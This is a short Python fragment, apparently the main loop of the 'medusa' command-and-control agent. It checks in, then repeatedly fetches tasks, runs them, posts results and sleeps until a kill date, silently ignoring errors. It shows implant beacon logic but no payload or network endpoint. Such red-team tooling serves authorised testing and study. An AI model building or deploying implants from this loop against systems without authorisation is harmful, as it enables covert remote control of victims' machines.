            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    medusa = medusa()
